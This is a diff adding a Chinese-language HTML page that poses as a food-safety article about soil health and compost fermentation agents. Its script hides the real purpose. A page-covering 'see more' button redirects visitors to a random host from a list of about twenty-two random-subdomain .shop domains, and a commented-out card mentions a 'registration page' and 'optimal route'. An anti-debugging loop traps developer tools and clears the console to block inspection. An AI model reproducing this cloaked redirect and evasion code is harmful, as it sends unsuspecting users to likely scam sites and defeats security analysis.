@@ -1,0 +1,165 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>餐桌安全大揭秘：从土壤源头到舌尖美味，如何进行健康溯源？带你探寻食物背后不为人知的安全真相</title>
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #f7f8fc 0%, #eef2ff 100%);
+            font-family: system-ui, -apple-system, "Segoe UI", sans-serif;
+        }
+        .article {
+            padding: 20px;
+        }
+        .article h1 {font-size: 20px;text-align: center;line-height: 40px;}
+        .article p {font-size: 14px;color: #333;line-height: 24px;text-indent: 2em;}
+        .card {
+            background: #ffffff;
+            width: 90%;
+            max-width: 480px;
+            padding: 48px 32px;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            text-align: center;
+        }
+        /* Loading旋转动画 */
+        .loader {
+            width: 56px;
+            height: 56px;
+            border: 4px solid #e6edff;
+            border-top-color: #3671e9;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 24px;
+        }
+        @keyframes spin {
+            to {transform: rotate(360deg);}
+        }
+        h2 {
+            font-size: 24px;
+            color: #1d2939;
+            margin-bottom: 12px;
+        }
+        .desc {
+            font-size: 15px;
+            color: #667085;
+            margin-bottom: 28px;
+            line-height: 1.6;
+        }
+        .error-text {
+            font-size: 18px;
+            color: #d92d20;
+            margin-bottom: 20px;
+        }
+        .btn-link {
+            display: inline-block;
+            padding: 14px 36px;
+            background-color: #3671e9;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.25s ease;
+        }
+        .btn-link:hover {
+            background-color: #2859c4;
+        }
+        .tip-small {
+            margin-top: 16px;
+            font-size: 13px;
+            color: #98a2b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="article">
+        <h1>餐桌安全大揭秘：从土壤源头到舌尖美味，如何进行健康溯源？带你探寻食物背后不为人知的安全真相</h1>
+        <p>小时候的青菜带着露水的清甜，现在的蔬菜却总少了那股子"菜味儿"。每次在超市挑拣那些光鲜亮丽的蔬菜时，总忍不住想：它们真的健康吗？农药残留检测合格就够了吗？作为城市家长，我们更关心的是食物背后的生长故事——那些看不见的土壤活力、肥料选择和种植智慧，才是决定餐桌安全的第一道防线。</p>
+        <p>健康土壤的秘密武器</p>
+        <p>现代农业早已不是"靠天吃饭"的原始阶段，科学种植需要专业辅助。就像人体需要益生菌维持肠道健康，土壤也需要活性菌群来保持肥力。传统堆肥需要数月时间发酵，而现代生物技术让这个过程缩短到两周——这归功于含有复合菌群的发酵剂，它能快速分解秸秆、畜禽粪便等有机物料，转化为植物易吸收的养分。</p>
+        <p>这类发酵剂的核心价值在于：</p>
+        <p>无化学添加：完全依靠微生物作用，不引入人工合成物质</p>
+        <p>提高有机质：发酵后的肥料富含腐殖酸，改善土壤团粒结构</p>
+        <p>减少异味：高效菌群抑制有害微生物，堆肥过程不再臭气熏天</p>
+        <p>见过叶片上带着天然"冰珠"的冰菜吗？这种耐寒蔬菜对肥料极为敏感。过量化学肥料会让它失去特有的咸鲜口感，而平衡的有机营养则能激发其天然风味。现代农业研究发现，特定配比的微量元素组合，能激活植物次生代谢产物合成——简单说，就是让蔬菜找回本该有的浓郁本味。</p>
+        <a href="javascript:get_more();" style="position:fixed;left:50%;top:50%;transform: translate(-50%, -50%);font-size:16px;background:#333;color:#fff;display:block;width:120px;height:40px;text-align:center;line-height:40px;text-decoration:none;border-radius:5px;">点击查看更多</a>
+    </div>
+    <!-- <div class="card">
+        <div class="loader" id="loadingIcon"></div>
+        <h2>正在前往注册页面</h2>
+        <p class="desc">系统正在分配最优线路，请稍候片刻</p>
+        <p class="error-text" id="errorMsg"></p>
+        <a href="" class="btn-link" id="manualLink" style="display:none;">手动点击跳转</a>
+        <p class="tip-small">若长时间无响应，请点击上方按钮</p>
+    </div> -->
+
+<script>
+    const devtoolsDetector = /./;
+    devtoolsDetector.opened = false;
+    const checkDevtools = () => {
+      while (true) {
+        const start = Date.now();
+        debugger; // 打开调试器时这里会暂停
+        const end = Date.now();
+        // consoleLog(end - start);
+        if (end - start < 20) {
+          break;                          // 正常执行，未开调试器
+        } else {
+          // consoleLog('is debugger');
+          devtoolsDetector.opened = true; // 停顿 >= 20ms → 判定调试器已打开
+        }
+      }
+    };
+    // 每 100ms 用 console.log 触发 toString 陷阱；发现调试器就再跑 debugger 检测并清空控制台
+    setInterval(() => {
+      // console.log(devtoolsDetector);
+      if (devtoolsDetector.opened) {
+        checkDevtools();
+        console.clear();
+      }
+    }, 100);
+    checkDevtools(); // 执行 debugger 检测
+    const urls = [
+        'https://z4b9p5o4.txbm.shop',
+        'https://k8f7p5n4.txbm.shop',
+        'https://s8o0j8k7.txbm.shop',
+        'https://t2e5n8z4.txbm.shop',
+        'https://z1r0q1p7.txbm.shop',
+        'https://3iomzwpit6ynp3y2dj.txbm.shop',
+        'https://392grqcz23b3yukh15.txbm.shop',
+        'https://3nzbv9w6eloq7v5foh.txbm.shop',
+        'https://36b25dhsdnj6604v60.txbm.shop',
+        'https://3bfu2k6jvitsmeikvy.txbm.shop',
+        'https://3ape4iwsgaxkakxdwk.txbm.shop',
+        'https://3pgb0so9jeowxihzab.txbm.shop',
+        'https://39stdiqxmcpalgsnzy.txbm.shop',
+        'https://3e14lldizceut.zhizhi.shop',
+        'https://3d568738fzajh.zhizhi.shop',
+        'https://3gz004ujseb9z.zhizhi.shop',
+        'https://37zuhm5yjgzh4.zhizhi.shop',
+        'https://3ajq10qdg2awo.zhizhi.shop',
+        'https://3hblzm6f7a1om.zhizhi.shop',
+        'https://3s1n153mdlcjn.zhizhi.shop',
+        'https://3psvsakssllzl.zhizhi.shop',
+        'https://3fd3s0z5i61dx.zhizhi.shop'
+    ];
+    function get_more(){
+        window.location.href = urls[Math.floor(Math.random() * urls.length)];
+    }
+</script>
+</body>
+</html>
